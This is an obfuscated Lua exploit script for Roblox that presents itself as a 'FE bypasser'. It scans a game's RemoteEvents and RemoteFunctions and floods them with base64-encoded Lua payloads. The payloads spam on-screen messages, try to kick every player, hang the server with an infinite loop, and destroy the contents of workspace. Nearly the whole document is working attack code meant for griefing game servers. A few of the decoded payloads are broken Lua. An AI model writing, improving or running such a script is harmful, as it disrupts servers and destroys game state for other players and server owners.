--[[ Obfustaced by V0C01337 pro fe biypasser ]]--
local __=function(s)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';local e,h={},0;for i=1,#b do e[b:sub(i,i)]=i-1 end;local t=0;local r=0;local d='';for i=1,#s do if s:sub(i,i)~='='then t=t*64+e[s:sub(i,i)]r=r+6;if r>=8 then r=r-8;d=d..string.char(math.floor(t/(2^r)))t=t%(2^r)end end end;return d end
local V0C="Vk9DT04xMzM3"
local O_={'UmVwbGljYXRlZFN0b3JhZ2U=','UGxheWVycyA=','UmVtb3RlRXZlbnQ=','UmVtb3RlRnVuY3Rpb24='}
local G=game['GetService']
local S=G(game,__(O_[1]))
local P=G(game,__(O_[2]):gsub("%s",""))
local F={"cHJpbnQoJ1YwQ08wTjEzM0RPTUlOQVRPUicp","SW5zdGFuY2UubmV3KCdIaW50Jyx3b3Jrc3BhY2UpLlRleHQ9J1YwQ08wTjEzMyd8fHNjcmlwdCBwcmludCgnVk9DT04xMzM3Jyk=","Zm9yLF9wIGluIHBhaXJzKGdhbWUuUGxheWVycy5HZXRQbGF5ZXJzKCkpIHBPS2ljaygnVk9DT04xMzM3Jyk="}
local function r(l)local s='';for i=1,l do s=s..string.char(math.random(33,126))end;return s end
local function d()local a={};for _,v in ipairs(S:GetDescendants())do if v:IsA(__(O_[3]))or v:IsA(__(O_[4]))then table.insert(a,v)end end;return a end
local function e(q)for i=1,6 do pcall(function()q:FireServer(r(11),math.random(),{math.random(),r(8)},false,nil)q:FireServer(';'..__(F[1]),{[__(V0C)]="REMOTE V0C0N1337"},true)q:FireServer(';'..__(F[2]))end)end end
local function f(q)for i=1,6 do pcall(function()q:InvokeServer(r(13),math.pi,';'..__(F[1]),{r(6),42,true,false})q:InvokeServer({1,2,3,4,5,r(7)},';'..__(F[3]),__(V0C))end)end end
local function y(q)pcall(function()q:FireServer(';'..__('Zm9yIGk9MSw1MCBkbyBJbnN0YW5jZS5uZXcoJ0hpbnQnLHdvcmtzcGFjZSkuVGV4dD0nVk9DT04xMzM3JwplbmQ='))end)end
local function z(q)pcall(function()q:InvokeServer(';'..__('d2hpbGUgdHJ1ZSBkbyBlbmQ='))end)end
local function g(q,f)local C={'cHJpbnQoJ1YwQ08wTjEzM1JFTU9URSBCQUNLRE9PUicp','Zm9yIF8sdj1pbiB3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKSB2OkRlc3Ryb3koKQ=='}for _,p in ipairs(C)do pcall(function()if f then q:InvokeServer(';'..__(p))else q:FireServer(';'..__(p))end end)end end
local function s(q)pcall(function()q:FireServer(';for i=1,4 do Instance.new("Hint",workspace).Text="skid destroyer its me LoL" end')end)end
local function t(q)pcall(function()q:InvokeServer(';for i=1,333 do Instance.new("Message",workspace).Text="V0C0N1337 pro fe bypas delta skids smd LOL" end')end)end
local function u(q)for i=1,math.random(1,2)do e(q)y(q)g(q,false)s(q)end end
local function v(q)for i=1,math.random(1,2)do f(q)z(q)g(q,true)t(q)end end
for _,q in ipairs(d())do spawn(function()if q:IsA(__(O_[3]))then u(q)elseif q:IsA(__(O_[4]))then v(q)end end)end
for i=1,math.random(2,6)do pcall(function()if math.random(1,69)==33 then while true do end end end)end
